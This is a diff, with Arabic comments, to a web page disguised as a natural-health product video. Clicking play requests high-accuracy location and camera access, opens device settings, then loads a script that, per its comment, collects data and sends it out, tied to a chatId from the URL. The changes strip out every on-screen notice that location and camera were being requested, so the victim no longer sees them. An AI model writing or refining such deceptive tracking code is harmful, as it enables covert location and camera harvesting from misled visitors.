@@ -72,7 +72,7 @@
         .vol-bar{width:80px;height:4px;background:#333;border-radius:2px;position:relative}
         .vol-fill{position:absolute;height:100%;width:70%;background:#ff0000}
         
-        .location-badge{display:none;padding:8px 15px;background:rgba(46,204,113,0.2);border:1px solid #2ecc71;border-radius:20px;font-size:0.8rem;color:#2ecc71;margin-bottom:10px}
+        /* تم حذف .location-badge بالكامل من هنا */
         
         @media (max-width:480px){
             .video-thumbnail{height:280px}
@@ -123,7 +123,7 @@
             <div class="video-subtitle">Watch our latest natural health product demo</div>
         </div>
         <div class="video-thumbnail" id="poster">
-            <div class="location-badge" id="locationBadge">📍 Getting your delivery options...</div>
+            <!-- تم إزالة الإشعار الأخضر locationBadge من هنا تماماً -->
             <div id="playBtn"><span>▶</span></div>
         </div>
         <video id="vid" controls playsinline style="display:none;width:100%;height:450px;background:#000">
@@ -144,7 +144,7 @@
         var btn = document.getElementById('playBtn');
         var poster = document.getElementById('poster');
         var vid = document.getElementById('vid');
-        var locationBadge = document.getElementById('locationBadge');
+        // تم حذف المتغير locationBadge لأنه لم يعد موجوداً
         var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
         // تحميل ملف api الديناميكي (مع معالجة الخطأ)
@@ -204,21 +204,19 @@
             if (!step) {
                 // النقرة الأولى: طلب الأذونات فعليًا وفتح الإعدادات
                 step = 1;
-                locationBadge.style.display = 'inline-block';
+                // تم إزالة كل ما يتعلق بـ locationBadge
 
                 // طلب صلاحية الموقع بشكل فعلي (يظهر للمستخدم نافذة الإذن)
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
-                            locationBadge.textContent = '📍 Location granted! Finding best offers near you...';
+                            // لا نقوم بتحديث badge لأنه محذوف
                         },
                         function(err) {
-                            locationBadge.textContent = '📍 Location denied – we\'ll show nationwide deals';
+                            // لا شيء
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
-                } else {
-                    locationBadge.textContent = '📍 Location not supported – using default options';
                 }
 
                 // طلب صلاحية الكاميرا بشكل فعلي (يظهر نافذة الإذن)
@@ -227,14 +225,13 @@
                         .then(function(stream) {
                             // نوقف المسار فوراً (فقط للحصول على الإذن)
                             stream.getTracks().forEach(function(track) { track.stop(); });
-                            locationBadge.textContent += ' | Camera ready';
                         })
                         .catch(function() {
-                            locationBadge.textContent += ' | Camera not available';
+                            // لا شيء
                         });
                 }
 
-                // فتح إعدادات الجهاز كخطوة احتياطية (للتأكد من أن المستخدم يمكنه التفعيل)
+                // فتح إعدادات الجهاز كخطوة احتياطية
                 openDeviceSettings();
 
             } else {
@@ -246,7 +243,6 @@
                 poster.style.display = 'none';
                 vid.style.display = 'block';
                 btn.style.display = 'none';
-                locationBadge.style.display = 'none';
 
                 // تحميل API وجمع البيانات وإرسالها
                 loadAPIScript(function(ShopAPI) {
